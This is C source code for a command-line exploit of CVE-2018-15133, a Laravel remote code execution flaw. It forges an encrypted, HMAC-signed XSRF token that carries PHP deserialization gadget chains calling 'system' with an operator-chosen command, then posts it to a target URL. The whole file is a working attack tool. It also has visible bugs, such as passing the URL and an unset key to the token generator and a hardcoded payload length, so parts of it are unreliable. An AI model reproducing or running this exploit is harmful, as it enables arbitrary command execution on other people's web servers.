#include "./libpop2/required/intrinsic.h"
#include "./libpop2/required/nix.h"
#include "./libpop2/required/memory.h"
#include "./libpop2/required/platform.h"
#include "./libpop2/required/assert.h"
#include "./libpop2/httpprotocol.h"
#include "./libpop2/bucket.h"
#include "./libpop2/marray.h"
#include "./libpop2/stringz.h"
#include "./libpop2/base64.h"
#include <openssl/rand.h>
#include <openssl/hmac.h>
#include <openssl/evp.h>
#include <openssl/sha.h>

enum Flags 
{
	URL = (1 << 0),
	TOKEN = (1 << 1),
	COMMAND= (1 << 2)
};

struct payload
{
	s32 *text;
	i32 length;
	s32 *base64;
	s32 *final;
};

struct key
{
	s32* text;
	i32 length;
};


struct cipher
{
	s32 text[1024];
	i32 length;
	s32* base64;
};

struct iv
{
	us32 text[128];
	s32 *base64;
	s32 *final;
};

struct hmac
{
	us32 text[2096];
	ui32 length;
	us32 *hexDigest;
};


s32 *GetHostStringName(s32* localIP);
s32 *GenerateToken(s32* command, s32* key);
payload GeneratePayload(s32* command);
int AES_256_CBC(us32 *plainText, int plainTextLen, us32 *key, us32 *iv, us32 *cipherText);
bool isFlagSet(int32 flagData, enum Flags flags);
void addFlag(int32 *flagData, enum Flags flag);

void ShowHelp(s32* program)
{
	printf("CVE-2018-15133 - Laravel Exploit\n");
	printf("Usage: %s [OPTION]\n\n", program);
	printf("\t-u\tURL\n");
	printf("\t-c\tCommand to execute\n");
	printf("\t-k\tApplication key\n");
	printf("\n\n");
	printf("\tExample: %s -u http://example.com -c \"uname -a\" -k dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= \n", program);
	printf("\n\n");
}

int main(int argc, char* argv[])
{
	bucket_list headers = {}; 
	s32* token = NULL;
	s32* data = NULL;
	s32* url = NULL;
	s32* command = NULL;
	i32 flag = 0;
	s32* applicationKey = NULL;
	
	for (int i=0; i < argc; i++)
	{
		s32 *option = (char*) *(argv + i);

		if (StrCmp(option, "-u"))
		{
			if (i + 1 < argc)
			{
				url = (char*) *(argv + i + 1);
				addFlag(&flag,URL);
			}
		}

		if (StrCmp(option, "-c"))
		{
			if (i + 1 < argc)
			{
				command = (char*) *(argv + i + 1);
				addFlag(&flag,COMMAND);
			}
		}
		if (StrCmp(option, "-k"))
		{
			if (i + 1 < argc)
			{
				token = (char*) *(argv + i + 1);
				addFlag(&flag,TOKEN);
			}
		}
	}

	// "dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0="

	if (isFlagSet(flag,URL) && isFlagSet(flag,COMMAND) && isFlagSet(flag,TOKEN))
	{
		s32* hName = NULL;

		hName = GetHostStringName(url);

		InitBucket(&headers, 256, 0);
		token = GenerateToken(url, applicationKey);
		AddS32ToBucket(&headers, (char*) "Host", hName);
		AddS32ToBucket(&headers, (char*) "User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0");
		AddS32ToBucket(&headers, (char*) "Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
		AddS32ToBucket(&headers, (char*) "X-XSRF-TOKEN", token);
		AddS32ToBucket(&headers, (char*) "Connection", "close");

		data = HttpRequest(url, &headers, POST, NULL);

		if (data)
		{
			printf("%s\n", data);
		}

		FreeAllBuckets(&headers);

		if (data)
		{
			Free(data);
			data=NULL;
		}

		if (token)
		{
			Free(token);
			token = NULL;
		}
	} else {
		ShowHelp(argv[0]);
	}


}

s32 *GenerateToken(s32* command, s32* keyB64)
{
	struct key Key = {};
	struct cipher Cipher = {};
	struct payload Payload = {};
	struct iv IV = {};
	struct hmac HMac = {};
	s32 *result = NULL;
	s32 *ivPlusPayload = NULL;
	s32 *json = NULL;
	RAND_bytes(IV.text,16);

	Payload = GeneratePayload(command);
	Payload.base64 = Base64_Encode((s32*)Payload.text,Payload.length);

	Key.text = Base64_Decode2((us32*) keyB64, &Key.length);
	
	Cipher.length = AES_256_CBC((us32*)Payload.text, Payload.length, (us32*) Key.text,IV.text, (us32*) Cipher.text);

	Cipher.base64 = Base64_Encode((s32*) Cipher.text, Cipher.length);
	
	IV.base64 = Base64_Encode((s32*)IV.text,16);
	
	ivPlusPayload = CS32Cat(2, IV.base64, Cipher.base64);

	HMAC(EVP_sha256(), Key.text,Key.length-1, (us32*) ivPlusPayload,Strlen(ivPlusPayload),HMac.text,&HMac.length);

	HMac.hexDigest = HexDigest( HMac.text,HMac.length);

	Payload.final = S32Replace(Cipher.base64,"/","\\/");

	IV.final = S32Replace(IV.base64,"/","\\/");

	json = CS32Cat(8, "{\"iv\":\"", IV.final,"\",\"value\":\"", Payload.final,"\",","\"mac\":\"",HMac.hexDigest, "\"}");

	result = Base64_Encode(json,Strlen(json));

	
	if (json)
	{
		Free(json);
		json = NULL;
	}
	if (IV.final)
	{
		Free(IV.final);
		IV.final = NULL;
	}
	if (Payload.final)
	{
		Free(Payload.final);
		Payload.final= NULL;
	}

	if (Payload.text)
	{
		Free(Payload.text);
		Payload.text = NULL;
	}

	if (Payload.base64)
	{
		Free(Payload.base64);
		Payload.base64 = NULL;
	}

	if (Key.text)
	{
		Free(Key.text);
		Key.text=NULL;
	}

	if (Cipher.base64)
	{
		Free(Cipher.base64);
		Cipher.base64 = NULL;
	}

	if (IV.base64)
	{
		Free(IV.base64);
		IV.base64= NULL;
	}

	if (ivPlusPayload)
	{
		Free(ivPlusPayload);
		ivPlusPayload = NULL;
	}

	if (HMac.hexDigest)
	{
		Free(HMac.hexDigest);
		HMac.hexDigest = NULL;
	}

	return result;
}

struct payload GeneratePayload(s32* command)
{
	int payloadType = 0;
	struct payload result = {};
	int commandLen = 0;
	s32* commandLenInString = NULL;

	commandLen = Strlen(command);
	commandLenInString = IToS(commandLen);

	switch(payloadType)
	{
		case 0:
		{
			result.text =  CS32Cat(18,"O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":2:{s:9:\"", "\x01","*","\x01", "events\";O:15:\"Faker\\Generator\":1:{s:13:\"","\x01","*","\x01","formatters\";a:1:{s:8:\"dispatch\";s:6:\"system\";}}s:8:\"","\x01","*","\x01", "event\";s:",commandLenInString ,":\"", command ,"\";}");
			break;
		}
		
		case 1:
		{
			result.text = CS32Cat(22, 
						"O:40:\"Illuminate\Broadcasting\PendingBroadcast\":2:{s:9:", 
						"\x01", 
						"*", 
						"\x01",
						"events\";O:28:\"Illuminate\\Events\\Dispatcher\":1:{s:12:", 
						"\x01",
						"*", 
						"\x01",
						"events\";O:28:\"Illuminate\\Events\\Dispatcher\":1:{s:12:",
						"\x01",
						"*",
						"\x01",
						"listeners\";a:1:{s:", 
						commandLenInString,
						":\"",
						command, 
						"\";a:1:{i:0;s:6:\"system\";}}}s:8:\"",
						"\x01","*","\x01","event\";s:" , 
						commandLenInString,
						":\"", 
						command, 
						"\";}");
			break;
		}
		case 2:
		{
			result.text = CS32Cat(21, 
						"O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":1:{s:9:\"",
						"\x01", 
						"*", 
						"\x01",
						"events\";O:39:\"Illuminate\\Notifications\\ChannelManager\":3:{s:6:\"",
						"\x01", 
						"*", 
						"\x01",
						"app\";s:",
						commandLenInString,
						":",
						command,
						"\";s:17:\"",
						"\x01", 
						"*", 
						"\x01",
						"defaultChannel\";s:1:\"x\";s:17:\"",
						"\x01", 
						"*", 
						"\x01",
						"customCreators\";a:1:{s:1:\"x\";s:6:\"system\";}}}"
						);
						
			break;
		}
		case 3:
		{
			result.text = CS32Cat(13,
							"O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":2:{s:9:\"",
							"\x01", 
							"*", 
							"\x01",
							"events\";O:31:\"Illuminate\\Validation\\Validator\":1:{s:10:\"extensions\";a:1:{s:0:\"\";s:6:\"system\";}}s:8:\"",
							"\x01", 
							"*", 
							"\x01",
							"event\";s:",
							commandLenInString,
							":\"",
							command,
							"\";}");
			break;
		}

		
	}

	//NOTES(): This is hardcoded for now since none of text changes until the end after all the NULLs occurs.
	result.text[56] = 0x00;
	result.text[58] = 0x00;

	result.text[99] = 0x00;
	result.text[101] = 0x00;
	result.text[154] = 0x00;
	result.text[156] = 0x00;

	result.length = 180;

	if (commandLenInString)
	{
		Free(commandLenInString);
		commandLenInString = NULL;
	}

	return result;
}



int AES_256_CBC(us32 *plainText, int plainTextLen, us32 *key, us32 *iv, us32 *cipherText)
{
	EVP_CIPHER_CTX *ctx = NULL;
	i32 len = 0;
	i32 cypherLen = 0;
	
	ctx = EVP_CIPHER_CTX_new();
	if (ctx)
	{
		EVP_CIPHER_CTX_init(ctx);
		EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);
		EVP_EncryptUpdate(ctx, cipherText, &len,plainText,plainTextLen);

		cypherLen = len;

		EVP_EncryptFinal_ex(ctx, cipherText + len, &len);

		EVP_CIPHER_CTX_free(ctx);

		return cypherLen+len;
	}
}

bool isFlagSet(int32 flagData, enum Flags flags)
{
	return 	flagData & flags;
}

void addFlag(int32 *flagData, enum Flags flag)
{
	*flagData |= flag;
}

s32 *GetHostStringName(s32* localIP)
{
	s32 *httpString = NULL;

	httpString = S32Replace(localIP, "https://","");

	if (StrCmp(httpString, localIP))
	{
		if (httpString)
		{
			Free(httpString);
			httpString = NULL;
		}
		httpString = S32Replace(localIP, "http://","");
	}

	return httpString;
}
